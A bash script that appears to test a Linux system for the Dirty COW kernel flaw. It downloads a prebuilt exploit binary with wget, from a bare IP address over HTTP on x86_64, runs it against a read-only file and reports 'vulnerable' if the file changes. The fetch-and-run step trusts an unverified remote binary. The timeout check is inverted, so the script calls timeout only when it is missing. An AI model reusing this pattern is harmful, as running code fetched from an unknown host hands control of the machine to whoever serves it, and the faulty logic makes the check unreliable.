#!/bin/bash

path='/tmp/dirty_cow_check'
arch=`uname -m`
RED="\033[1;31m"
YELLOW="\033[1;33m"
GREEN="\033[1;32m"
RESET="\033[0m"
set -e

mkdir -p $path
cd $path
echo "Downloading POC...."

if [ "$arch" = "x86_64" ];then
	wget -q 'http://139.129.11.227/pokemon.64' -O poc.bin
else
	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/bin/pokemon.32' -O poc.bin
fi

echo "AAAA" > text_file
chmod -R 777 $path
chmod 0404 text_file
chmod a+x poc.bin
echo "Running the POC...."
set +e

if [ ! -x "/usr/bin/timeout" ];then
	timeout 3 /tmp/dirty_cow_check/poc.bin text_file "BBBB"
else
	/tmp/dirty_cow_check/poc.bin text_file "BBBB" &
	sleep 3
	killall poc.bin >>/dev/null 2>>/dev/null
fi

text=`cat $path/text_file`
if [ "$text" = "AAAA" ];then
	echo
	echo -e "${GREEN}Congratulations! \nYour system is safe from dirtycow!${RESET}"
	echo 
elif [ "$text" = "BBBB" ];then
	echo
	echo -e "${RED}Warning! \nYour system is Vulnerable to dirtycow!${RESET}"
fi

rm -rf $path
echo "Quitting..."
